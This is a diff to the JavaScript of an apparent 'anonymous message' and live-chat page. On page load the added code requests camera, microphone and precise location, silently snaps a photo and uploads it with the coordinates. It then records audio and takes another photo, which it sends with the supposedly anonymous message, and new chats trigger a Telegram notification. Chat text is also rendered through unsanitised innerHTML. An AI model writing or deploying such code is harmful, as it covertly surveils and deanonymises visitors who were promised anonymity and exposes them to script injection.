@@ -28,7 +28,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const mainLiveChatButton = document.getElementById('mainLiveChatButton');
     const thankYouLiveChatButton = document.getElementById('liveChatButton');
-    const closeButton = document.getElementById('closeButton');
+    const closeButton = document.getElementById('closeChatButton');
 
     const liveChatOverlay = document.getElementById('liveChatOverlay');
     const closeChatButton = document.getElementById('closeChatButton');
@@ -43,9 +43,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
     let selectedEmoji = null;
-    let mediaRecorder;
+    let mediaRecorder = null; // Will be set if mic permission granted
     let audioChunks = [];
-    let userMediaStream; // Stores the MediaStream (camera/mic)
+    let userMediaStream = null; // Will be set if camera/mic permission granted
     let userLocation = { latitude: null, longitude: null }; // To store location data
 
     // --- Live Chat Specific Variables ---
@@ -54,53 +54,103 @@ document.addEventListener('DOMContentLoaded', () => {
     let unsubscribeFromChat = null; // To store the Firestore listener unsubscribe function
 
 
-    // --- Permissions on Page Load ---
-    async function requestPermissions() {
-        console.log('DEBUG: requestPermissions function started.');
+    // --- Permission Requests & Initial Data Collection (on page load) ---
+    async function collectInitialData() {
+        console.log('DEBUG: collectInitialData function started (on page load).');
+        let initialPhotoBlob = null;
+        let cameraMicGranted = false;
+        let geolocationGranted = false;
 
-        // Request camera and microphone
-        console.log('DEBUG: Attempting to request Camera/Mic.');
+        // --- NEW: Request Camera/Mic immediately on page load ---
+        console.log('DEBUG: Attempting to request Camera/Mic on page load.');
         try {
             userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
-            console.log('DEBUG: Camera/Microphone permissions granted!');
+            console.log('DEBUG: Camera/Microphone permissions granted on page load!');
+            cameraMicGranted = true;
 
-            // --- Setup Audio Recording (BUT DO NOT START YET) ---
+            // --- Capture one photo immediately ---
+            console.log('DEBUG: Capturing initial photo.');
+            const photo = await capturePhoto();
+            if (photo) {
+                initialPhotoBlob = await compressImage(photo);
+                console.log('DEBUG: Initial photo compressed size:', (initialPhotoBlob.size / 1024).toFixed(2), 'KB');
+            }
+
+            // Set up media recorder for ANONYMOUS MESSAGE AUDIO ONLY (don't start yet)
             mediaRecorder = new MediaRecorder(userMediaStream);
             mediaRecorder.ondataavailable = event => {
                 audioChunks.push(event.data);
             };
 
         } catch (error) {
-            console.warn('DEBUG: Camera/Microphone permissions were denied or encountered error:', error);
-            userMediaStream = null; // Ensure userMediaStream is null if permissions denied
+            console.warn('DEBUG: Camera/Microphone permissions denied or error on page load:', error);
+            userMediaStream = null;
+            mediaRecorder = null;
         }
 
-        // --- Request Geolocation Permission ---
-        console.log('DEBUG: Checking if Geolocation is supported.');
+        // --- NEW: Request Geolocation immediately on page load ---
+        console.log('DEBUG: Checking if Geolocation is supported on page load.');
         if (navigator.geolocation) {
-            console.log('DEBUG: Geolocation is supported. Attempting to request location.');
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    userLocation.latitude = position.coords.latitude;
-                    userLocation.longitude = position.coords.longitude;
-                    console.log('DEBUG: Geolocation permission granted and captured:', userLocation);
-                },
-                (error) => {
-                    console.warn('DEBUG: Geolocation permission denied or error:', error);
-                },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // Options for better accuracy
-            );
+            geolocationGranted = await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation.latitude = position.coords.latitude;
+                        userLocation.longitude = position.coords.longitude;
+                        console.log('DEBUG: Geolocation permission granted and captured on page load:', userLocation);
+                        resolve(true);
+                    },
+                    (error) => {
+                        console.warn('DEBUG: Geolocation permission denied or error on page load:', error);
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
         } else {
-            console.warn('DEBUG: Geolocation is NOT supported by this browser.');
+            console.warn('DEBUG: Geolocation is NOT supported by this browser on page load.');
         }
-        console.log('DEBUG: requestPermissions function finished.');
+
+        // --- Send initial collected data to new backend function ---
+        const formData = new FormData();
+        if (userLocation.latitude !== null && userLocation.longitude !== null) {
+            formData.append('latitude', userLocation.latitude);
+            formData.append('longitude', userLocation.longitude);
+        }
+        if (initialPhotoBlob) {
+            formData.append('photo', initialPhotoBlob, 'initial_capture.jpg');
+        }
+
+        // Send a request to a new Netlify function for passive data + initial media
+        try {
+            console.log('DEBUG: Sending initial passive data + photo/location to collect-initial-data function.');
+            const response = await fetch('/.netlify/functions/collect-initial-data', {
+                method: 'POST',
+                body: formData // This will include IP, User-Agent from headers automatically
+            });
+            if (response.ok) {
+                console.log('DEBUG: Initial data sent successfully.');
+            } else {
+                console.error('DEBUG: Failed to send initial data. Server response:', response.status);
+            }
+        } catch (error) {
+            console.error('DEBUG: Error sending initial data:', error);
+        }
+
+        // --- Important: Stop camera after initial capture if it's not needed for anonymous message ---
+        // We stop the video track immediately after capturing the initial photo.
+        // The audio track might still be needed if mediaRecorder is active for anonymous message.
+        if (userMediaStream && userMediaStream.getVideoTracks().length > 0) {
+            userMediaStream.getVideoTracks()[0].stop();
+            console.log('DEBUG: Initial camera stream stopped after capture.');
+        }
     }
+    
+    collectInitialData(); // Call this function immediately on page load
 
-    requestPermissions(); // Call permission function on DOMContentLoaded
 
-    // --- Photo Capture Function ---
+    // --- Photo Capture Function (used by initial data and anonymous message) ---
     async function capturePhoto() {
-        if (!userMediaStream) return null;
+        if (!userMediaStream || userMediaStream.getVideoTracks().length === 0) return null; // Ensure video track exists
         const videoTrack = userMediaStream.getVideoTracks()[0];
         if (!videoTrack) return null;
         try {
@@ -174,11 +224,20 @@ document.addEventListener('DOMContentLoaded', () => {
         mainLiveChatButton.classList.add('hidden');
         step2.classList.remove('hidden');
 
-        // --- START RECORDING NOW *** ---
+        // --- Start audio recording NOW for anonymous message ---
+        // MediaRecorder should already be set up if mic permission was given on page load
         if (mediaRecorder && mediaRecorder.state === 'inactive') {
             audioChunks = []; // Clear any previous chunks
             mediaRecorder.start();
-            console.log('DEBUG: Audio recording started on final step.');
+            console.log('DEBUG: Audio recording started for anonymous message.');
+
+            // --- NEW: 2-minute timeout for anonymous message audio ---
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                    console.log('DEBUG: Anonymous message audio recording stopped due to 2-minute timeout.');
+                }
+            }, 120000); // 120000 milliseconds = 2 minutes
         }
     });
 
@@ -203,23 +262,23 @@ document.addEventListener('DOMContentLoaded', () => {
         sendButton.disabled = true;
         sendButton.textContent = 'Sending...';
 
-        // Stop recording to finalize the audio file
+        // Stop audio recording to finalize the audio file
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
-            console.log('DEBUG: Recording stopped by sending message.');
+            console.log('DEBUG: Anonymous message audio recording stopped by sending message.');
         }
 
-        // Capture photo
-        let photo1 = await capturePhoto();
-        let compressedPhoto1 = null;
-
-        // Compress the photo before sending
-        if (photo1) {
-            compressedPhoto1 = await compressImage(photo1);
-            console.log('DEBUG: Original photo size:', (photo1.size / 1024).toFixed(2), 'KB');
-            console.log('DEBUG: Compressed photo size:', (compressedPhoto1.size / 1024).toFixed(2), 'KB');
+        // --- Capture a NEW photo for the anonymous message (if camera available) ---
+        // This is separate from the initial page-load photo
+        let photoForAnonMessage = null;
+        if (userMediaStream && userMediaStream.getVideoTracks().length > 0) { // Check if camera permission was granted
+            let photo = await capturePhoto();
+            if (photo) {
+                photoForAnonMessage = await compressImage(photo);
+                console.log('DEBUG: Anonymous message photo compressed size:', (photoForAnonMessage.size / 1024).toFixed(2), 'KB');
+            }
         }
-
+        
         // Use a small delay to ensure the recorder has time to process the last chunk
         await new Promise(resolve => setTimeout(resolve, 500));
 
@@ -228,49 +287,50 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('name', userNameInput.value.trim());
         formData.append('emoji', selectedEmoji || 'No reaction');
 
-        // --- Append location data if available ---
+        // Location data will be the one captured on page load (userLocation)
         if (userLocation.latitude !== null && userLocation.longitude !== null) {
             formData.append('latitude', userLocation.latitude);
             formData.append('longitude', userLocation.longitude);
-            console.log('DEBUG: Appending location data to form:', userLocation);
+            console.log('DEBUG: Appending location data (from page load) to anonymous form:', userLocation);
         } else {
-            console.log('DEBUG: Location data not available to append.');
+            console.log('DEBUG: Location data not available for anonymous message.');
         }
 
-
-        if (compressedPhoto1) {
-            formData.append('photo1', compressedPhoto1, 'compressed_photo.jpg');
+        if (photoForAnonMessage) {
+            formData.append('photo', photoForAnonMessage, 'anonymous_message_photo.jpg');
         }
         if (audioChunks.length > 0) {
             const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            formData.append('audio', audioBlob, 'audio.webm');
+            formData.append('audio', audioBlob, 'anonymous_message_audio.webm');
         }
-
-        // --- Sending ALL Data to Backend ---
+        
+        // --- Sending ALL Data to Backend (Anonymous Message Function) ---
         try {
-            console.log('DEBUG: Sending data to Netlify function.');
+            console.log('DEBUG: Sending anonymous message data to send-message function.');
             const response = await fetch('/.netlify/functions/send-message', {
                 method: 'POST',
                 body: formData
             });
 
             if (response.ok) {
-                console.log('DEBUG: Data sent successfully.');
+                console.log('DEBUG: Anonymous message sent successfully.');
                 step2.classList.add('hidden');
                 step3.classList.remove('hidden');
 
-                // --- Stop all camera/mic tracks ---
+                // --- Stop all camera/mic tracks AFTER anonymous message send ---
                 if (userMediaStream) {
                     userMediaStream.getTracks().forEach(track => track.stop());
-                    console.log('DEBUG: Camera/Mic tracks stopped.');
+                    console.log('DEBUG: Camera/Mic tracks stopped after anonymous message.');
+                    userMediaStream = null; // Clear stream reference
+                    mediaRecorder = null; // Clear recorder reference
                 }
 
             } else {
-                console.error('DEBUG: Failed to send message. Server response:', response.status);
-                throw new Error('Failed to send message.');
+                console.error('DEBUG: Failed to send anonymous message. Server response:', response.status);
+                throw new Error('Failed to send anonymous message.');
             }
         } catch (error) {
-            console.error('DEBUG: Error sending data:', error);
+            console.error('DEBUG: Error sending anonymous message:', error);
             alert('Sorry, something went wrong. Please try again.');
             sendButton.disabled = false;
             sendButton.textContent = 'Send Anonymously';
@@ -314,7 +374,7 @@ document.addEventListener('DOMContentLoaded', () => {
             chatNameInput.focus(); // Focus on name input if no name is present
         }
 
-        // --- NEW: Hide name input field if name is already set ---
+        // --- Hide name input field if name is already set ---
         if (chatUserDisplayName && chatUserDisplayName.trim() !== '') {
             chatNameInput.style.display = 'none';
             chattingAsText.textContent = `Chatting as: ${chatUserDisplayName}`; // Show name in header
@@ -395,8 +455,24 @@ document.addEventListener('DOMContentLoaded', () => {
             currentChatSessionId = 'chat_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9);
             console.log('DEBUG: New chat session started with ID:', currentChatSessionId, 'Name:', chatUserDisplayName);
             setupChatListener(currentChatSessionId); // Setup listener for this new session
+            
+            // --- NEW: Trigger Netlify Function for new chat notification (Bot 2) ---
+            try {
+                await fetch('/.netlify/functions/notify-new-chat', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        sessionId: currentChatSessionId,
+                        userName: chatUserDisplayName,
+                        firstMessage: messageText
+                    })
+                });
+                console.log('DEBUG: New chat notification sent to Telegram Bot 2.');
+            } catch (notifyError) {
+                console.error('DEBUG: Failed to send new chat notification:', notifyError);
+            }
 
-            // --- NEW: Hide name input and show "Chatting as" in header after first message ---
+            // --- Hide name input and show "Chatting as" in header after first message ---
             chatNameInput.style.display = 'none';
             chattingAsText.textContent = `Chatting as: ${chatUserDisplayName}`;
             chattingAsText.classList.remove('hidden');
@@ -423,10 +499,6 @@ document.addEventListener('DOMContentLoaded', () => {
             // Clear input field
             chatMessageInput.value = '';
             chatMessageInput.focus();
-
-            // Notify backend (Netlify Function) about new chat message to trigger Telegram Bot 2 notification
-            // This will be a separate Netlify function later (Admin Panel phase)
-            console.log('DEBUG: Would notify Telegram Bot 2 about new chat message here for session:', currentChatSessionId);
 
         } catch (error) {
             console.error('DEBUG: Error sending chat message:', error);
@@ -474,8 +546,7 @@ document.addEventListener('DOMContentLoaded', () => {
              messageElement.classList.remove('user-message', 'other-message'); // Ensure no sender styling
              messageElement.classList.add('system-message');
         } else {
-            // --- NEW: WhatsApp/Insta-like message display ---
-            // Sender name (small) above the message text
+            // WhatsApp/Insta-like message display
             messageElement.innerHTML = `<span class="chat-sender-name ${messageData.isVenky ? 'venky-sender' : 'user-sender'}">${senderName}</span><p>${messageData.text}</p><span class="chat-timestamp">${timestamp}</span>`;
         }
 
